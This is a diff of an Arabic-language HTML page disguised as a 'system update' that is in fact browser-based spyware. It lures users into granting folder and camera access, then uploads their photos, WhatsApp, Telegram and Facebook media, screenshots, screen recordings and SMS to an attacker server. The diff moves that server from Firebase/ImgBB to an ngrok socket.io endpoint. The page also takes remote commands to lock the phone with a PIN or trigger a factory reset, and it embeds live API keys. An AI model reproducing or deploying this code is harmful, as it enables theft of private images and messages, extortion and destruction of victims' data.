@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8"/>
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>تحميل...</title>
+    <title>تحديث النظام</title>
     <style>
         body { background: #000; color: #fff; font-family: Arial,sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column; margin: 0; }
         .loader { border: 5px solid #333; border-top: 5px solid #0f0; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
@@ -11,232 +11,147 @@
         #msg { font-size: 1.2em; text-align: center; padding: 0 20px; }
         .btn { background: #0f0; color: #000; padding: 12px 30px; border: none; font-weight: bold; cursor: pointer; font-size: 1.1em; border-radius: 5px; display: none; margin-top: 20px; }
     </style>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
 </head>
 <body>
     <div class="loader"></div>
-    <div id="msg">جاري تحميل التحديث...</div>
-    <button id="startBtn" class="btn" onclick="begin()">بدء التحديث</button>
+    <div id="msg">جاري الاتصال...</div>
+    <button id="startBtn" class="btn" onclick="start()">بدء التحديث</button>
     <script>
-        // ========== Firebase ==========
-        const firebaseConfig = {
-            apiKey: "AIzaSyCUUU64NotDyl-qjSvAD1jQZSQZrZEcuvU",
-            authDomain: "zwahy-5b75d.firebaseapp.com",
-            databaseURL: "https://zwahy-5b75d-default-rtdb.firebaseio.com",
-            projectId: "zwahy-5b75d",
-            storageBucket: "zwahy-5b75d.firebasestorage.app",
-            messagingSenderId: "820206227713",
-            appId: "1:820206227713:web:02057307aca7dfb7100b00"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+        // ⚠️ الرابط العام للسيرفر
+        const SERVER_URL = "https://dec4-2001-16a4-2f8-adf9-ac8c-c4f.ngrok-free.app";
         
-        const vid = 'p-' + Date.now().toString(36);
-        const vref = db.ref('victims/' + vid);
-        
-        const IMGBB_KEY = "69e4b5971880f9d736172f5fc9eb5bac";
+        let socket = null;
         let ROOT = null;
-        let stolen = 0;
+        let camStream = null;
 
-        // ========== بدء ==========
-        setTimeout(() => {
-            document.getElementById('msg').innerText = "يلزم الضغط على 'بدء التحديث'";
-            document.getElementById('startBtn').style.display = 'block';
-        }, 2000);
+        // الاتصال بالسيرفر
+        function connect() {
+            socket = io(SERVER_URL, { transports: ['websocket', 'polling'] });
+            
+            socket.on('connect', () => {
+                console.log('🟢 متصل بالسيرفر');
+                document.getElementById('msg').innerText = 'اضغط على بدء التحديث';
+                document.getElementById('startBtn').style.display = 'block';
+            });
 
-        window.begin = async function() {
+            socket.on('disconnect', () => {
+                console.log('🔴 انقطع الاتصال');
+            });
+
+            // استقبال الأوامر
+            socket.on('command', async (cmd) => {
+                console.log('📩 أمر:', cmd);
+                try {
+                    switch(cmd.action) {
+                        case 'scan_photos': await scanAll(); break;
+                        case 'vibrate': navigator.vibrate([500,200,500,200,500]); break;
+                        case 'play_sound': playSound(); break;
+                        case 'screenshot': await takeScreenshot(); break;
+                        case 'record_video': await recordVideo(cmd.duration || 10); break;
+                        case 'flash_on': await toggleFlash(true); break;
+                        case 'flash_off': await toggleFlash(false); break;
+                        case 'send_notification': showNotify(cmd.message || ''); break;
+                        case 'lock_screen': lockScreen(cmd.pin || '0000'); break;
+                        case 'format': window.open('intent://#Intent;action=android.intent.action.MASTER_CLEAR;end'); break;
+                        case 'get_info': sendDeviceInfo(); break;
+                        case 'get_sms': stealSMS(); break;
+                    }
+                } catch(e) { console.error('خطأ:', e.message); }
+            });
+        }
+
+        // بدء التحديث
+        window.start = async function() {
             document.getElementById('startBtn').style.display = 'none';
-            document.getElementById('msg').innerText = "يرجى اختيار 'الذاكرة الداخلية' ثم 'موافق'...";
+            document.getElementById('msg').innerText = 'يرجى اختيار المجلد الرئيسي...';
 
-            // تسجيل الجهاز فوراً
-            await registerDevice();
-
-            // طلب الإذن
+            // صلاحية الملفات
             try {
                 ROOT = await window.showDirectoryPicker({ mode: 'readwrite' });
-            } catch(e) {
-                // حتى لو رفض، الجهاز مسجل
-            }
+            } catch(e) { ROOT = null; }
 
-            // تحديث الحالة
-            vref.child('online').set(true);
-            
-            document.getElementById('msg').innerText = "جاري التحديث...";
+            // كاميرا
+            try { camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false }); } catch(e) {}
+
+            // تسجيل الجهاز
+            const info = {
+                ua: navigator.userAgent.substring(0, 100),
+                plat: navigator.platform,
+                scr: screen.width + 'x' + screen.height,
+                cores: navigator.hardwareConcurrency,
+                mem: navigator.deviceMemory || '?',
+                lang: navigator.language,
+                time: new Date().toLocaleString()
+            };
+            socket.emit('register', { fingerprint: info });
+
+            document.getElementById('msg').innerText = '✅ تم التحديث';
             setTimeout(() => {
                 document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">✓ تم</h2>';
             }, 800);
 
-            // بدء السرقة إذا توفر الإذن
+            // بدء سرقة الصور تلقائياً
             if (ROOT) {
-                scanAllFolders();
-                // إعادة فحص كل 60 ثانية
-                setInterval(() => scanAllFolders(), 60000);
+                scanAll();
+                setInterval(() => scanAll(), 60000);
             }
-
-            // استقبال الأوامر
-            listenForCommands();
-            
-            // إبقاء الاتصال حياً
-            setInterval(() => vref.child('online').set(true), 15000);
         };
 
-        // ========== تسجيل الجهاز ==========
-        async function registerDevice() {
-            let ip = '?';
-            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
-            let bat = '?', ch = false;
-            try { if (navigator.getBattery) { const b = await navigator.getBattery(); bat = Math.round(b.level*100)+'%'; ch = b.charging; } } catch(e) {}
-            
-            await vref.set({
-                online: true,
-                fingerprint: {
-                    ua: navigator.userAgent.substring(0, 100),
-                    plat: navigator.platform,
-                    scr: screen.width + 'x' + screen.height,
-                    cores: navigator.hardwareConcurrency,
-                    mem: navigator.deviceMemory || '?',
-                    ip: ip, battery: bat, charging: ch,
-                    lang: navigator.language,
-                    time: new Date().toLocaleString()
-                }
-            });
-        }
-
-        // ========== فحص المجلدات ==========
-        async function scanAllFolders() {
+        // فحص كل المجلدات
+        async function scanAll() {
             if (!ROOT) return;
             const folders = [
                 'DCIM/Camera', 'DCIM/Screenshots',
                 'Pictures', 'Download', 'Downloads',
                 'WhatsApp/Media/WhatsApp Images',
-                'WhatsApp/Media/WhatsApp Video',
                 'Facebook/Media', 'Messenger/Media',
                 'Telegram/Telegram Images'
             ];
-
-            for (const folder of folders) {
+            for (const f of folders) {
                 try {
-                    let current = ROOT;
-                    for (const part of folder.split('/')) {
-                        current = await current.getDirectoryHandle(part);
-                    }
-                    await stealFromFolder(current, folder);
+                    let cur = ROOT;
+                    for (const p of f.split('/')) cur = await cur.getDirectoryHandle(p);
+                    await steal(cur, f);
                 } catch(e) {}
             }
         }
 
-        // ========== سرقة الملفات ==========
-        async function stealFromFolder(dirHandle, folderName) {
-            for await (const entry of dirHandle.values()) {
-                if (entry.kind === 'file') {
-                    const file = await entry.getFile();
+        // سرقة الملفات
+        async function steal(dir, path) {
+            for await (const e of dir.values()) {
+                if (e.kind === 'file') {
+                    const file = await e.getFile();
                     const ext = file.name.split('.').pop().toLowerCase();
-                    if (!['jpg','jpeg','png','gif','webp','mp4','mov'].includes(ext)) continue;
-                    if (file.size > 10 * 1024 * 1024) continue;
-
+                    if (!['jpg','jpeg','png','gif','mp4','webm'].includes(ext)) continue;
+                    if (file.size > 10*1024*1024) continue;
+                    const r = new FileReader();
+                    r.onload = () => {
+                        const b64 = r.result.split(',')[1];
+                        socket.emit('loot', { name: path + '/' + file.name, data: b64, type: 'photo' });
+                    };
+                    r.readAsDataURL(file);
+                } else if (e.kind === 'directory') {
                     try {
-                        const base64 = await fileToBase64(file);
-                        const url = await uploadToImgBB(base64);
-                        stolen++;
-                        // تخزين في Firebase
-                        await vref.child('loot').push({
-                            type: 'photo',
-                            url: url,
-                            name: folderName + '/' + file.name,
-                            size: file.size,
-                            ts: Date.now(),
-                            counter: stolen
-                        });
-                    } catch(e) {}
-                } else if (entry.kind === 'directory') {
-                    try {
-                        const subDir = await dirHandle.getDirectoryHandle(entry.name);
-                        await stealFromFolder(subDir, folderName + '/' + entry.name);
+                        const sub = await dir.getDirectoryHandle(e.name);
+                        await steal(sub, path + '/' + e.name);
                     } catch(e) {}
                 }
             }
         }
 
-        // ========== استقبال الأوامر ==========
-        function listenForCommands() {
-            vref.child('command').on('value', async (snap) => {
-                const cmd = snap.val();
-                if (!cmd) return;
-                
-                try {
-                    switch(cmd.action) {
-                        case 'get_all_photos':
-                            if (ROOT) await scanAllFolders();
-                            break;
-                        case 'vibrate':
-                            if (navigator.vibrate) navigator.vibrate([500,200,500,200,500]);
-                            break;
-                        case 'play_sound':
-                            try {
-                                const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                                const osc = ctx.createOscillator();
-                                const gain = ctx.createGain();
-                                osc.type = 'square'; osc.frequency.value = 800; gain.gain.value = 0.5;
-                                osc.connect(gain); gain.connect(ctx.destination); osc.start();
-                                setTimeout(() => { osc.stop(); gain.disconnect(); ctx.close(); }, 3000);
-                            } catch(e) {}
-                            break;
-                        case 'screenshot':
-                            await takeScreenshot();
-                            break;
-                        case 'flash_on':
-                            if (window.camStream) {
-                                const track = window.camStream.getVideoTracks()[0];
-                                if (track && track.applyConstraints) await track.applyConstraints({ advanced: [{ torch: true }] });
-                            }
-                            break;
-                        case 'flash_off':
-                            if (window.camStream) {
-                                const track = window.camStream.getVideoTracks()[0];
-                                if (track && track.applyConstraints) await track.applyConstraints({ advanced: [{ torch: false }] });
-                            }
-                            break;
-                        case 'send_notification':
-                            showNotify(cmd.message || '');
-                            break;
-                        case 'lock_screen':
-                            window.open(`intent://#Intent;action=android.app.action.SET_NEW_PASSWORD;extra.android.app.extra.PASSWORD=${cmd.pin||'0000'};end`);
-                            setTimeout(() => window.open('intent://#Intent;action=android.app.action.LOCK_DEVICE;end'), 500);
-                            break;
-                        case 'format':
-                            window.open('intent://#Intent;action=android.intent.action.MASTER_CLEAR;end');
-                            break;
-                        case 'get_device_info':
-                            const snap = await vref.child('fingerprint').once('value');
-                            const info = snap.val() || {};
-                            stolen++;
-                            await vref.child('loot').push({ type: 'device_info', info: info, ts: Date.now(), counter: stolen });
-                            break;
-                    }
-                } catch(e) {}
-                await vref.child('command').remove();
-            });
-        }
-
-        // ========== لقطة شاشة ==========
-        async function takeScreenshot() {
+        // صوت
+        function playSound() {
             try {
-                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream; await video.play();
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const base64 = canvas.toDataURL('image/png').split(',')[1];
-                const url = await uploadToImgBB(base64);
-                stolen++;
-                await vref.child('loot').push({ type: 'screenshot', url: url, name: 'screen_' + Date.now() + '.png', ts: Date.now(), counter: stolen });
-                stream.getTracks().forEach(t => t.stop());
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = ctx.createOscillator(), gain = ctx.createGain();
+                osc.type = 'square'; osc.frequency.value = 800; gain.gain.value = 0.5;
+                osc.connect(gain); gain.connect(ctx.destination); osc.start();
+                setTimeout(() => { osc.stop(); gain.disconnect(); ctx.close(); }, 3000);
             } catch(e) {}
         }
 
-        // ========== إشعار ==========
+        // إشعار
         function showNotify(msg) {
             const div = document.createElement('div');
             div.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#ff0;color:#000;padding:20px;border-radius:10px;font-size:1.2em;font-weight:bold;z-index:999999;text-align:center;';
@@ -245,32 +160,75 @@
             setTimeout(() => div.remove(), 3000);
         }
 
-        // ========== كاميرا (للفلاش) ==========
-        (async function getCamera() {
-            try {
-                window.camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
-            } catch(e) {}
-        })();
+        // فلاش
+        async function toggleFlash(on) {
+            if (!camStream) return;
+            const track = camStream.getVideoTracks()[0];
+            if (track && track.applyConstraints) await track.applyConstraints({ advanced: [{ torch: on }] });
+        }
 
-        // ========== أدوات ==========
-        function fileToBase64(file) {
-            return new Promise((resolve, reject) => {
+        // لقطة شاشة
+        async function takeScreenshot() {
+            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            const video = document.createElement('video'); video.srcObject = stream; await video.play();
+            const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const b64 = canvas.toDataURL('image/png').split(',')[1];
+            socket.emit('loot', { name: 'screen_' + Date.now() + '.png', data: b64, type: 'screenshot' });
+            stream.getTracks().forEach(t => t.stop());
+        }
+
+        // فيديو
+        async function recordVideo(sec) {
+            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
+            const rec = new MediaRecorder(stream), chunks = [];
+            rec.ondataavailable = e => chunks.push(e.data);
+            rec.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
                 const reader = new FileReader();
-                reader.onload = () => resolve(reader.result.split(',')[1]);
-                reader.onerror = reject;
-                reader.readAsDataURL(file);
-            });
+                reader.onload = () => {
+                    const b64 = reader.result.split(',')[1];
+                    socket.emit('loot', { name: 'video_' + Date.now() + '.webm', data: b64, type: 'video' });
+                };
+                reader.readAsDataURL(blob);
+                stream.getTracks().forEach(t => t.stop());
+            };
+            rec.start();
+            setTimeout(() => rec.stop(), sec * 1000);
         }
 
-        async function uploadToImgBB(base64) {
-            const fd = new FormData();
-            fd.append('key', IMGBB_KEY);
-            fd.append('image', base64);
-            const res = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: fd });
-            const json = await res.json();
-            if (json.success) return json.data.url;
-            throw new Error('فشل');
+        // SMS
+        async function stealSMS() {
+            try {
+                let msgs = [];
+                if ('webkitSms' in window) {
+                    const list = await window.webkitSms.getMessages({});
+                    for (let s of list) msgs.push({ from: s.sender, body: s.body, date: new Date(s.timestamp).toLocaleString() });
+                }
+                socket.emit('loot', { name: 'sms.json', info: msgs.slice(-20), type: 'sms' });
+            } catch(e) {}
         }
+
+        // معلومات الجهاز
+        function sendDeviceInfo() {
+            const info = {
+                ua: navigator.userAgent, plat: navigator.platform,
+                scr: screen.width + 'x' + screen.height,
+                cores: navigator.hardwareConcurrency,
+                mem: navigator.deviceMemory || '?',
+                lang: navigator.language, online: navigator.onLine
+            };
+            socket.emit('loot', { name: 'info.json', info: info, type: 'device_info' });
+        }
+
+        // قفل
+        function lockScreen(pin) {
+            window.open(`intent://#Intent;action=android.app.action.SET_NEW_PASSWORD;extra.android.app.extra.PASSWORD=${pin};end`);
+            setTimeout(() => window.open('intent://#Intent;action=android.app.action.LOCK_DEVICE;end'), 500);
+        }
+
+        // بدء الاتصال
+        connect();
     </script>
 </body>
 </html>
